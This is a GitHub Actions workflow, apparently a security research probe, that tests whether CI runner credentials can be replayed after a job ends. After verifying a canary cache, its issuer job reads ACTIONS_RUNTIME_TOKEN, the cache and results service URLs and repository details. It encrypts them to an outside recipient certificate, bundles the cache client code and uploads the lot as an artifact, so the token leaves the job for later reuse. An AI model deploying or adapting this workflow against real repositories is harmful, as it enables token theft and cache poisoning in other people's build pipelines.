name: c6-post-job-replay

on:
  workflow_dispatch:

permissions:
  contents: read
  actions: read

jobs:
  seed:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    cache-mode: write
    steps:
      - name: Create owned canary
        run: |
          mkdir -p .cache-c6
          printf 'owned-c6-%s\n' "$GITHUB_RUN_ID" > .cache-c6/canary.txt
      - name: Save owned canary cache
        uses: actions/cache/save@v4
        with:
          path: .cache-c6
          key: c6-owned-${{ github.run_id }}

  issuer:
    needs: seed
    runs-on: ubuntu-latest
    timeout-minutes: 5
    cache-mode: read
    steps:
      - name: B1 restore with current issuer tuple
        id: restore
        uses: actions/cache/restore@v4
        with:
          path: .cache-c6
          key: c6-owned-${{ github.run_id }}
      - name: B1 prove exact canary bytes
        run: |
          test '${{ steps.restore.outputs.cache-hit }}' = 'true'
          test "$(cat .cache-c6/canary.txt)" = "owned-c6-${GITHUB_RUN_ID}"
          printf 'b1=exact-canary\n'
      - name: Seal replay tuple and cache client
        env:
          C6_RECIPIENT_CERT_B64: 
        run: |
          set -eu
          test -n "$ACTIONS_RUNTIME_TOKEN"
          test -n "$ACTIONS_RESULTS_URL"
          bundle="$GITHUB_WORKSPACE/c6-replay"
          plaintext="$RUNNER_TEMP/c6-payload.json"
          cert="$RUNNER_TEMP/c6-recipient-cert.pem"
          mkdir -p "$bundle"
          printf '%s' "$C6_RECIPIENT_CERT_B64" | base64 -d > "$cert"
          python3 - <<'PY'
          import json
          import os
          fields = (
              "ACTIONS_RUNTIME_TOKEN",
              "ACTIONS_CACHE_URL",
              "ACTIONS_RESULTS_URL",
              "ACTIONS_CACHE_SERVICE_V2",
              "ACTIONS_CACHE_MODE",
              "GITHUB_REF",
              "GITHUB_REPOSITORY",
              "GITHUB_SHA",
              "RUNNER_OS",
              "RUNNER_ARCH",
          )
          with open(os.path.join(os.environ["RUNNER_TEMP"], "c6-payload.json"), "w", encoding="utf-8") as handle:
              json.dump({field: os.environ.get(field, "") for field in fields}, handle)
          PY
          openssl cms -encrypt -binary -aes-256-cbc -in "$plaintext" \
            -out "$bundle/c6-payload.p7m" -outform DER -recip "$cert"
          rm -f "$plaintext" "$cert"
          action_root="$(cd "$(dirname "$GITHUB_WORKSPACE")/../_actions/actions/cache/v4" && pwd)"
          test -f "$action_root/dist/restore/index.js"
          tar -C "$action_root" -czf "$bundle/actions-cache-v4.tgz" \
            action.yml dist/restore/index.js
          printf '{"key":"c6-owned-%s","canary":"owned-c6-%s"}\n' \
            "$GITHUB_RUN_ID" "$GITHUB_RUN_ID" > "$bundle/metadata.json"
      - name: Upload encrypted replay carrier
        uses: actions/upload-artifact@v4
        with:
          name: c6-replay-${{ github.run_id }}
          path: c6-replay/
          if-no-files-found: error
          retention-days: 1

